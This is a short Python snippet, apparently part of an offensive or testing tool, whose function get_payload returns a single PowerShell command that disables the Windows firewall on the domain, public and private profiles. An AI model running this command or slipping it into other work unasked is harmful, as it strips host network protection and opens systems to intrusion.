def get_payload():
    return [
        "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
    ]
